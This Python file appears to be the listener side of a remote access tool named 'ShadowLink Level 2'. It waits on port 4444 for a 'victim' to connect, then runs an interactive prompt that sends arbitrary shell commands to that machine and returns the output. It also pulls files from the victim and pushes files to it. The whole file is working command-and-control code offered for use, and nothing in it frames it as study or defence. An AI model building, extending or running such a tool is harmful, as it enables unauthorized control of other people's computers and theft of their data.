import socket
import os

SERVER_IP = "0.0.0.0"
PORT = 4444

def receive_file(sock, filename):
    """Protocol to receive a file from the client"""
    try:
        # 1. Listen for file existence confirm: "EXISTS <size>"
        response = sock.recv(1024).decode()
        if not response.startswith("EXISTS"):
            print(f"[-] Error: {response}")
            return

        filesize = int(response.split()[1])
        
        # 2. Send Acknowledge
        sock.send("OK".encode())
        
        # 3. Read the exact number of bytes
        print(f"[*] Downloading {filename} ({filesize} bytes)...")
        with open(filename, "wb") as f:
            total_recv = 0
            while total_recv < filesize:
                data = sock.recv(4096) # Read in 4KB chunks
                if not data: break
                f.write(data)
                total_recv += len(data)
                
        print(f"[+] Download Complete: {filename}")
        
    except Exception as e:
        print(f"[-] Transfer Error: {e}")

def send_file(sock, filename):
    """Protocol to send a file to the client"""
    if not os.path.exists(filename):
        print("[-] File not found on server.")
        return

    filesize = os.path.getsize(filename)
    
    # 1. Send file info: "UPLOAD <filename> <size>"
    # We send a specific header so client knows it's a file
    sock.send(f"UPLOAD {filename} {filesize}".encode())
    
    # 2. Wait for Client "OK"
    response = sock.recv(1024).decode()
    if response != "OK":
        print(f"[-] Client refused transfer: {response}")
        return

    # 3. Send bytes
    print(f"[*] Uploading {filename}...")
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(4096)
            if not chunk: break
            sock.send(chunk)
            
    # 4. Wait for confirmation
    print(sock.recv(1024).decode())

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((SERVER_IP, PORT))
    s.listen(1)
    print(f"[*] ShadowLink Level 2 Listening on {PORT}...")
    
    client, addr = s.accept()
    print(f"[+] Victim Connected: {addr[0]}")
    
    while True:
        command = input(f"ShadowLink@{addr[0]}> ")
        
        if not command.strip(): continue
        if command == 'exit': break
        
        # --- COMMAND LOGIC ---
        if command.startswith("download"):
            client.send(command.encode())
            filename = command.split()[1]
            receive_file(client, filename)
            
        elif command.startswith("upload"):
            filename = command.split()[1]
            send_file(client, filename)
            # Note: The 'send_file' function handles the sending. 
            # We don't send the raw text command 'upload' first because
            # our custom send_file function handles the header.
            
        else:
            # Standard Shell Command
            client.send(command.encode())
            print(client.recv(4096).decode())

    client.close()
    s.close()

if __name__ == "__main__":
    start_server()